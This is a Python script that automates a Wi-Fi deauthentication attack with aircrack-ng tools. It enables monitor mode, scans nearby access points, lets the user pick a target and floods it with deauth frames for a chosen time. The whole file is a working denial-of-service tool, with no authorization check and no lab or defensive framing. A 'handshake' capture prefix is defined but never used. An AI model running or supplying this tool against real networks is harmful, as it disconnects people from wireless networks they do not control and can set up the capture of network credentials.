
import subprocess
import time
import csv
import os
import signal
import sys

# Allow passing interface as CLI argument
INTERFACE = sys.argv[1] if len(sys.argv) > 1 else "wlan0"
MONITOR_INTERFACE = INTERFACE + "mon"
CAPTURE_FILE_PREFIX = "handshake"
CSV_FILE = "scan-01.csv"
aps = []
target = None
scan_proc = None


# Handle Ctrl+C
def signal_handler(sig, frame):
    print("\n[!] Ctrl+C detected. Cleaning up...")
    if scan_proc:
        scan_proc.terminate()
    disable(MONITOR_INTERFACE)
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)


# Enable monitor mode
def monitor(interface):
    print("[*] Enabling monitor mode...")
    subprocess.run(
        ["sudo", "airmon-ng", "start", interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(3)


# Scan for APs
def scan(monitor_interface):
    print("[*] Scanning for Wi-Fi networks (20s)...")
    # Clean up old scan files
    for f in os.listdir():
        if f.startswith("scan-") and f.endswith(".csv"):
            os.remove(f)

    global scan_proc
    scan_proc = subprocess.Popen(
        [
            "sudo",
            "airodump-ng",
            monitor_interface,
            "--output-format",
            "csv",
            "-w",
            "scan",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(20)
    scan_proc.terminate()
    time.sleep(2)


# Parse scan results
def parse_csv():
    if not os.path.exists(CSV_FILE):
        print("[!] Scan failed. CSV not found.")
        sys.exit(1)

    with open(CSV_FILE, "r", encoding="utf-8", errors="ignore") as f:
        reader = csv.reader(f)
        for row in reader:
            if len(row) < 14:
                continue
            if "Station MAC" in row[0]:
                break
            bssid = row[0].strip()
            channel = row[3].strip()
            power = row[8].strip()
            essid = row[13].strip()
            if bssid and essid:
                aps.append((bssid, channel, essid, power))

    if not aps:
        print("[!] No access points found.")
        sys.exit(1)


# Display access points and select one
def display_aps():
    print(f"\n{'No.':<4} {'Power':<6} {'ESSID':<25} {'Channel':<7}")
    print("-" * 50)
    for i, ap in enumerate(aps):
        print(f"{i + 1:<4} {ap[3]:<6} {ap[2]:<25} {ap[1]:<7}")

    while True:
        choice = input("\nSelect target number: ")
        if choice.isdigit() and 1 <= int(choice) <= len(aps):
            global target
            target = aps[int(choice) - 1]
            break
        print("[!] Invalid choice.")

    print(f"\n[+] Target selected: {target[2]} ({target[0]}) on channel {target[1]}")


# Perform deauth attack
def deauth():
    t = int(input("Enter time for attack in seconds: "))
    print(f"[*] Setting channel to {target[1]} ...")
    subprocess.run(["sudo", "iwconfig", MONITOR_INTERFACE, "channel", target[1]])

    print(f"[+] Performing deauth attack on {target[2]} ({target[0]})...")
    proc = subprocess.Popen(
        ["sudo", "aireplay-ng", "--deauth", "0", "-a", target[0], MONITOR_INTERFACE],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(t)
    proc.terminate()
    print("[*] Attack complete.")


# Disable monitor mode
def disable(monitor_interface):
    print("[*] Disabling monitor mode...")
    time.sleep(2)
    subprocess.run(
        ["sudo", "airmon-ng", "stop", monitor_interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    print("[*] Monitor mode disabled. Exiting.")


def clean():
    pass


# ------------------------ Main Execution ------------------------
monitor(INTERFACE)
scan(MONITOR_INTERFACE)
parse_csv()
display_aps()
deauth()
disable(MONITOR_INTERFACE)
